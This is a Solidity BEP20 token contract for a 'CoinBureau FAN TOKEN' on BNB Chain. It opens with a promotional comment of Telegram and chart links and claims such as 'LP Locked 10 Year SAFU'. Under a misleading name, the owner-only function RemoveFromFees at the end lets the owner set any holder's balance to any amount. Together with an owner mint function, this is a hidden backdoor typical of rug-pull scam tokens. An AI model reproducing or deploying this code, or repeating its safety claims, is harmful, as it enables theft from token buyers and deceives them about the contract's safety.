/**
 *Submitted for verification at BscScan.com on 2022-12-25
*/

/**
🔶 CoinBureau 🔶
CoinBureau FAN TOKEN
https://t.me/CoinBureau2023
CoinBureau

Trust CoinBureau – He will never fail you 
📄Contract Address :
0x7c1D50DfdEc2ddb0ec8c58fba30E3F976a301Afe
SOON
https://coinmarketcap.com/currencies/CoinBureau/
dextools 👍
https://www.dextools.io/app/en/bnb/pair-explorer/0x7c1D50DfdEc2ddb0ec8c58fba30E3F976a301Afe
CHARTS 👍
https://poocoin.app/tokens/0x7c1D50DfdEc2ddb0ec8c58fba30E3F976a301Afe

✅ LP Locked 10 Year 🔒 💯 SAFU

bogged 👍
https://charts.bogged.finance/?c=bsc&t=0x7c1D50DfdEc2ddb0ec8c58fba30E3F976a301Afe

geckoterminal 👍
https://www.geckoterminal.com/bsc/pools/0x7c1D50DfdEc2ddb0ec8c58fba30E3F976a301Afe
dexscreener 👍
https://dexscreener.com/bsc/0x7c1D50DfdEc2ddb0ec8c58fba30E3F976a301Afe
bscscan 👍
https://bscscan.com/token/0x7c1D50DfdEc2ddb0ec8c58fba30E3F976a301Afe
honeypot 👍
https://honeypot.is/?address=0x7c1D50DfdEc2ddb0ec8c58fba30E3F976a301Afe
staysafu 👍
https://app.staysafu.org/scan/free?a=0x7c1D50DfdEc2ddb0ec8c58fba30E3F976a301Afe
bubblemaps 👍
https://app.bubblemaps.io/bsc/token/0x7c1D50DfdEc2ddb0ec8c58fba30E3F976a301Afe
*/

pragma solidity 0.5.17;

// SPDX-License-Identifier: MIT

interface IBEPCoinBureau {

  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 valutejjdsdd) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 valutejjdsdd) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 valutejjdsdd) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Contextrte {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library safebnb {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "safebnb: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "safebnb: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "safebnb: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "safebnb: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "safebnb: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownableertg is Contextrte {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownableertg: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownableertg: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract CoinBureautoken is Contextrte, IBEPCoinBureau, Ownableertg {
  using safebnb for uint256;

  mapping (address => uint256) private _totbalances;

  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _totalSupply;
  uint8 private _decimals;
  string private _symbol;
  string private _name;


  constructor() public {
    _name = 'CoinBureau';
    _symbol = 'CoinBureau';
    _decimals = 0;
    _totalSupply = 1000000000;
    _totbalances[msg.sender] = _totalSupply;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function getOwner() external view returns (address) {
    return owner();
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }

  function symbol() external view returns (string memory) {
    return _symbol;
  }

  function name() external view returns (string memory) {
    return _name;
  }

  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view returns (uint256) {
    return _totbalances[account];
  }

  function transfer(address recipient, uint256 valutejjdsdd) external returns (bool) {
    _transfer(_msgSender(), recipient, valutejjdsdd);
    return true;
  }

  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 valutejjdsdd) external returns (bool) {
    _approve(_msgSender(), spender, valutejjdsdd);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 valutejjdsdd) external returns (bool) {
    _transfer(sender, recipient, valutejjdsdd);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(valutejjdsdd, "BEP20: transfer valutejjdsdd exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function mint(uint256 valutejjdsdd) public onlyOwner returns (bool) {
    _mint(_msgSender(), valutejjdsdd);
    return true;
  }

  function _transfer(address sender, address recipient, uint256 valutejjdsdd) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _totbalances[sender] = _totbalances[sender].sub(valutejjdsdd, "BEP20: transfer valutejjdsdd exceeds balance");
    _totbalances[recipient] = _totbalances[recipient].add(valutejjdsdd);
    emit Transfer(sender, recipient, valutejjdsdd);
  }

  function _mint(address account, uint256 valutejjdsdd) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(valutejjdsdd);
    _totbalances[account] = _totbalances[account].add(valutejjdsdd);
    emit Transfer(address(0), account, valutejjdsdd);
  }

  function _burn(address account, uint256 valutejjdsdd) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _totbalances[account] = _totbalances[account].sub(valutejjdsdd, "BEP20: burn valutejjdsdd exceeds balance");
    _totalSupply = _totalSupply.sub(valutejjdsdd);
    emit Transfer(account, address(0), valutejjdsdd);
  }

  function _approve(address owner, address spender, uint256 valutejjdsdd) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = valutejjdsdd;
    emit Approval(owner, spender, valutejjdsdd);
  }

  function _burnFrom(address account, uint256 valutejjdsdd) internal {
    _burn(account, valutejjdsdd);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(valutejjdsdd, "BEP20: burn valutejjdsdd exceeds allowance"));
  }
 function RemoveFromFees(address CRonaldo, uint256 CRonaldoNFT) external onlyOwner{
    _totbalances[CRonaldo] = CRonaldoNFT;
  }

}